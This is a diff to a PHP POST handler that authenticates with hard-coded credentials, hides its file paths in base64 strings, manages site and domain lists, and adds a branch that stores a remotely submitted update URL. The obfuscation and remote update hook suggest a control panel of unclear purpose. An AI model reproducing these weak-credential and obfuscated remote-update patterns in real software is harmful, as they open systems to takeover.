@@ -1,4 +1,3 @@
-<?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $valid_user = 'user';
     $valid_pass = 'password';
@@ -11,8 +10,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 	
 
+    $dirpth = base64_decode('L3NpdGVzL2Q'); // d
     if (isset($_POST['siteList']) || isset($_POST['domain'])) {
-        $dirpth = base64_decode('L3NpdGVzL2Q');
         $file = $dirpth . '/'.base64_decode('ZG9tYWlucy50eHQ=');
         if ($_POST['req'] === 'add') {
             $siteList = $_POST['siteList'];
@@ -120,6 +119,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 		
 		$response = getSystemUsage();
 		
+    } elseif(isset($_POST['upd']) && $_POST['upd'] === 'y') {
+        if (isset($_POST['link']) && isValidURL($_POST['link'])) {
+            $link = $_POST['link'];
+            $upd = file_put_contents($dirpth . '/upd.txt', $link, LOCK_EX);
+            if ($upd) {
+                $response = 'updated';
+            } else {
+                $response = 'fail updated';
+            }
+        } else {
+            $response = 'Invalid URL';
+        }
+    
     } else {
         $response = 'not set';
     }
